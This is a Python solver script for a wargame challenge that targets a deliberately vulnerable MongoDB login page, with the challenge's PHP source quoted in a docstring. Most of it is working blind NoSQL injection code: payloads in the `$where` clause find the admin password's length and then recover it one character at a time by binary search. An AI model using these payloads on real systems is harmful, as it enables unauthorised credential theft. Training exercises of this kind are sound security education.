#!/usr/bin/env python3
import los
import time


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'Hello admin' in args[0]


def main():
    '''
    Incubus 48 MongoDB NoSQL injection

    $db = mongodb_connect();
    if(preg_match('/prob|_|\(/i', $_GET['id'])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\(/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = array("\$where" => "function(){return obj.id=='{$_GET['id']}'&&obj.pw=='{$_GET['pw']}';}");
    echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
    $result = mongodb_fetch_array($db->prob_incubus->find($query));
    if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

    $query = array("id" => "admin");
    $result = mongodb_fetch_array($db->prob_incubus->find($query));
    if($result['pw'] === $_GET['pw']) solve("incubus");
    '''

    url = "https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php"
    cook = los.check_cookies(url)

    param = dict(pw="'||obj.pw.length>'%s")
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    result = ''
    num_of_requests = 0

    for i in range(0, len_of_key):
        param = {'pw': f"'||obj.id=='admin'&&obj.pw[{i}]<'%s"}
        left, num_requests = los.find_binary(url, param, check_func,
                                             48, 127, cook, letter=True)
        print(chr(left))
        result += chr(left)
        num_of_requests += num_requests

    print('num_of_requests:', num_of_requests)

    param = {'id': 'admin', 'pw': result}
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Incubus Clear!')


if __name__ == '__main__':
    main()
